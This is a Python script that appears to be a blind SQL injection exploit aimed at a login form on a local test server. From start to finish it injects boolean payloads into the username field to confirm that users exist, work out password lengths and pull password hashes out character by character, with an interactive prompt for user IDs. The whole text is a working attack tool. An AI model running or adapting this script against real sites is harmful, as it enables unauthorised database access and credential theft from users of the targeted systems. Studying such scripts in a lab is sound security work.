import requests

total_queries = 0
charset = "0123456789abcdef"
target = "http://127.0.0.1:5000"
needle = "Welcome back"

def injected_query(payload):
    """
    Sends a POST request with an SQL injection payload in the `username` field
    and checks if the injected boolean condition evaluated to True or False
    by analyzing the response content (Blind SQL Injection by content).

    :param payload: The boolean SQL expression to inject into the query.
    :type payload: str
    :return: True if the condition is True (needle string missing in response),
             False otherwise.
    :rtype: bool
    """
    global total_queries
    r = requests.post(target, data={"username": "admin' and {}--".format(payload), "password":"password"})
    total_queries += 1
    return needle.encode() not in r.content


def boolean_query(offset, user_id, character, operator=">"):
    """
    Tests a specific character of the password hash using a boolean condition.
    This is used to determine if the actual character is greater, equal, or less
    than the tested character.

    :param offset: Zero-based index of the character in the password hash.
    :type offset: int
    :param user_id: The ID of the user whose password is being extracted.
    :type user_id: int
    :param character: A candidate character from the charset to compare against.
    :type character: str
    :param operator: The SQL comparison operator (default ">").
    :type operator: str
    :return: True if the condition holds, False otherwise.
    :rtype: bool
    """
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex ('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload)


def invalid_user(user_id):
    """
    Checks whether a user ID exists in the database using a boolean-based query.

    :param user_id: The ID of the user to check.
    :type user_id: int
    :return: True if the user does not exist, False otherwise.
    :rtype: bool
    """
    payload = "(select id from user where id = {}) >=0".format(user_id)
    return injected_query(payload)


def password_length(user_id):
    """
    Determines the password length for a given user by incrementally testing
    possible lengths until the correct one is found.

    :param user_id: The ID of the user whose password length is being determined.
    :type user_id: int
    :return: The password length.
    :rtype: int
    """
    i = 0
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            return i
        i += 1


def extract_hash(charset, user_id, password_length):
    """
    Extracts the password hash sequentially, one character at a time,
    by iterating through the charset until a match is found.

    :param charset: The set of possible characters (e.g., hex digits).
    :type charset: str
    :param user_id: The ID of the user whose password is being extracted.
    :type user_id: int
    :param password_length: The known password length.
    :type password_length: int
    :return: The extracted password hash as a string.
    :rtype: str
    """
    found = ""
    for i in range(0, password_length):
        for j in range(0, len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found


def total_queries_taken():
    """
    Prints the total number of queries executed so far and resets the counter.

    :return: None
    """
    global total_queries
    print("\t\t[!] Total queries taken: {}".format(total_queries))
    total_queries = 0


# === Main Loop ===
# Continuously prompts the user for a user ID, then:
# - Checks if the user exists.
# - If valid, determines password length and extracts the hash.
# - Displays progress and query counts.
# - Stops gracefully if interrupted with Ctrl+C.
while True:
    try:
        user_id = input("enter a user ID to extract the password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_taken()
            print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
            total_queries_taken()
        else:
            print("\t[X] User {} does not exist!".format(user_id))
    except KeyboardInterrupt:
        break
